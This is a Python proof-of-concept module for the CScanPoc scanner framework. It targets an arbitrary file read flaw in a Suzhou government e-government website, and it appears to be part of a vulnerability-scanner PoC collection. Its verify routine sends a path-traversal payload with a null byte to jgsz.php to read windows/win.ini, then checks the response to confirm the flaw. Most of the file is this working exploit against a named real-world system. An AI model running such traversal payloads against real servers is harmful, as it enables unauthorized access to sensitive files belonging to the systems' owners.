# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Cncert_0020'  # 平台漏洞编号
    name = '苏州市编制委员任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-04-13'  # 漏洞公布时间
    desc = '''
        电子政务网是国家机关在政务活动中，全面应用现代信息技术、网络技术以及办公自动化技术等进行办公、管理和为社会提供公共服务的一种全新的管理模式的系统。
        苏州市编制委员任意文件读取漏洞，攻击者可以通过构造恶意语句来读取任意文件敏感信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=97306'  #
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '电子政务网'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0c6ef23a-0565-4074-a690-20f290b9e90a'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/jgsz.php?top=../../../../../../../../../../../../../../../../windows/win.ini%00'
            response = requests.get(vul_url)
            if response.status_code == 200 and '[extensions]' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
